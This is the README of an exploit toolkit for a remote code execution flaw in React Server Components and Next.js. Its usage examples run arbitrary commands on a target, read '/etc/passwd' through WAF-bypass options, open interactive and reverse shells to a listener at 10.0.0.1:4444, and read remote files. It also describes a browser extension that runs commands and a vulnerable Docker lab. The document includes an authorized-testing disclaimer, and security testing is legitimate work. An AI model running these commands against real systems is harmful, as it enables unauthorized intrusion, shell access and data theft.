# React2Shell

CVE-2025-55182 Scanner & Exploit Toolkit for Next.js/React Server Components RCE.

## Repository Structure

```
React2Shell/
├── browser-extension/    # Chrome extension for browser-based detection
│   ├── manifest.json
│   ├── content.js
│   ├── popup.html/js
│   └── background.js
├── cli/                  # Command-line scanner & exploit tool
│   ├── react2shell.py
│   └── requirements.txt
├── docs/                 # Documentation and references
│   ├── CVE-2025-55182.md
│   └── reference/
├── lab/                  # Docker lab environment for testing
│   ├── vulnerable/       # Vulnerable Next.js app (React 19.2.0)
│   ├── patched/          # Patched Next.js app (React 19.2.1)
│   ├── waf/              # ModSecurity WAF container
│   └── docker-compose.yml
└── nuclei/               # Nuclei templates
    └── CVE-2025-55182.yaml
```

## Quick Start

### CLI Tool
```bash
cd cli
pip install -r requirements.txt

# Scan a target
python react2shell.py https://target.com

# Execute command
python react2shell.py https://target.com -c "id"

# Interactive shell
python react2shell.py https://target.com -i
```

### Browser Extension
1. Open `chrome://extensions/`
2. Enable "Developer mode"
3. Click "Load unpacked"
4. Select the `browser-extension` directory

### Lab Environment
```bash
cd lab
docker-compose up -d

# Vulnerable: http://localhost:3011
# Patched: http://localhost:3012
# WAF Protected: http://localhost:3013
```

### Nuclei Scanner
```bash
nuclei -t nuclei/CVE-2025-55182.yaml -u https://target.com
```

## Features

### CLI Tool (`cli/react2shell.py`)
- **Vulnerability scanning** - Single URL or batch scanning from file
- **Command execution** (`-c`) - Run arbitrary commands
- **Interactive shell** (`-i`) - Persistent command session
- **Reverse shell** (`-r`) - Multiple types: nc, bash, perl, python, ruby
- **File reading** (`-f`) - Read remote files directly
- **Local scanning** (`-L`) - Check package.json for vulnerable versions
- **WAF bypass** - Junk padding (`-w`), Unicode encoding (`-u`), Vercel-specific (`-V`)
- **Proxy support** (`-x`) - Route through Burp Suite or other proxies
- **Safe mode** (`-s`) - Side-channel detection without code execution

### Browser Extension (`browser-extension/`)
- Auto-detection of RSC vulnerability indicators
- Configurable exploit paths
- Command execution with output display
- Enable/disable toggle
- Visual vulnerable/safe indicators

### Lab Environment (`lab/`)
- Vulnerable Next.js instance with CTF flags
- Patched instance for comparison testing
- WAF-protected instance for bypass testing
- Dashboard for attack visualization

## CLI Usage Examples

```bash
# Basic scan
python react2shell.py https://target.com

# Execute command with all WAF bypasses
python react2shell.py https://target.com -c "cat /etc/passwd" -w -u

# Interactive shell through proxy
python react2shell.py https://target.com -i -x http://127.0.0.1:8080

# Reverse shell
python react2shell.py https://target.com -r -l 10.0.0.1 -p 4444 -S bash

# Scan local project for vulnerable versions
python react2shell.py -L /path/to/nextjs-app

# Batch scan with output
python react2shell.py targets.txt -t 20 -o results.json -v
```

## All CLI Options

```
Execution Options:
  -c, --cmd             Command to execute
  -i, --interactive     Interactive shell session
  -r, --reverse         Reverse shell mode
  -l, --lhost           Listener host
  -p, --lport           Listener port
  -S, --shell-type      Shell type (nc, nc-mkfifo, bash, perl, python, ruby)
  -f, --read-file       Read a remote file

Scanning Options:
  -P, --path            Paths to test (comma-separated or file)
  -t, --threads         Number of threads (default: 10)
  -T, --timeout         Request timeout in seconds (default: 10)
  -s, --safe            Safe mode (no code execution)
  -L, --local           Scan local project directory

Bypass Options:
  -w, --waf-bypass      Junk data padding
  -W, --waf-size        Junk size in KB (default: 128)
  -u, --unicode         Unicode encoding bypass
  -V, --vercel-bypass   Vercel-specific bypass
  --windows             Windows PowerShell payloads

Request Options:
  -x, --proxy           Proxy URL (e.g., http://127.0.0.1:8080)
  -H, --header          Custom headers
  -A, --user-agent      Custom User-Agent
  -k, --insecure        Disable SSL verification

Output Options:
  -o, --output          Save results to JSON
  -v, --verbose         Verbose output with version detection
  -q, --quiet           Only show vulnerable targets
  --no-color            Disable colors
  --no-banner           Hide banner
```

## CVE-2025-55182 Details

| Field | Value |
|-------|-------|
| **CVSS** | 10.0 (Critical) |
| **Impact** | Unauthenticated Remote Code Execution |
| **Affected** | React 19.x, Next.js 14.x/15.x with App Router |
| **Mechanism** | Prototype pollution via React Flight Protocol |

### Patched Versions
| Package | Vulnerable | Patched |
|---------|------------|---------|
| React | 19.0.0 - 19.2.0 | 19.2.1+ |
| Next.js | 14.0.0 - 15.4.7 | 15.4.8+ |

## Credits

- [mrknow001/RSC_Detector](https://github.com/mrknow001/RSC_Detector)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Chocapikk/CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182)
- [hackersatyamrastogi/react2shell-ultimate](https://github.com/hackersatyamrastogi/react2shell-ultimate)
- [ProjectDiscovery Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)

## Disclaimer

This toolkit is for **authorized security testing only**. Only use on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

---

**CVE-2025-55182 | CVSS 10.0 | For authorized security testing only**
